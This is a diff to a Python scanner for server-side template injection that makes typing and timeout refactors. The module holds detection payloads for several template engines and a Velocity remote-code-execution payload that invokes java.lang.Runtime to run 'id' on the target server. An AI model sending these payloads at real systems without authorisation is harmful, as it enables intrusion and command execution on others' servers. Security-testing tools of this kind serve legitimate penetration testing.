@@ -12,13 +12,12 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-import asyncio
 import aiohttp
 import re
-from typing import Dict, List, Optional, Any
+from typing import Dict, List, Any, cast
 
 # Ported and enhanced from tplmap engines and common SSTI research
-SSTI_ENGINE_SIGNATURES = {
+SSTI_ENGINE_SIGNATURES: Dict[str, Dict[str, Any]] = {
     "jinja2": {
         "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
         "verification_regex": r"49|7777777",
@@ -53,7 +52,10 @@ SSTI_ENGINE_SIGNATURES = {
         "detection_payloads": ["#set($x=7*7)$x"],
         "verification_regex": r"49",
         "description": "Java based template engine",
-        "rce_payload": "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\").getInputStream())#foreach($i in [1..$str.available()])$str.read()#end"
+        "rce_payload": (
+            "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\").getInputStream())"
+            "#foreach($i in [1..$str.available()])$str.read()#end"
+        )
     },
     "freemarker": {
         "detection_payloads": ["${7*7}"],
@@ -75,25 +77,28 @@ SSTI_ENGINE_SIGNATURES = {
     }
 }
 
+
 async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
-    \"\"\"
+    """
     Detects Server Side Template Injection in a specific URL parameter.
-    \"\"\"
+    """
     detected_engines = []
-    
+    timeout = aiohttp.ClientTimeout(total=5)
+
     for engine, data in SSTI_ENGINE_SIGNATURES.items():
         for payload in data["detection_payloads"]:
             params = {parameter: payload}
             try:
-                async with session.get(url, params=params, timeout=5) as response:
+                async with session.get(url, params=params, timeout=timeout) as response:
                     text = await response.text()
-                    if re.search(data["verification_regex"], text):
+                    pattern = cast(str, data["verification_regex"])
+                    if re.search(pattern, text):
                         # Potential match, try second payload if available to confirm
                         if len(data["detection_payloads"]) > 1:
                             second_payload = data["detection_payloads"][1]
-                            async with session.get(url, params={parameter: second_payload}, timeout=5) as resp2:
+                            async with session.get(url, params={parameter: second_payload}, timeout=timeout) as resp2:
                                 text2 = await resp2.text()
-                                if re.search(data["verification_regex"], text2):
+                                if re.search(pattern, text2):
                                     detected_engines.append({
                                         "engine": engine,
                                         "description": data["description"],
@@ -111,7 +116,7 @@ async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) 
                             break
             except Exception:
                 continue
-                
+
     return detected_engines
 
 if __name__ == "__main__":
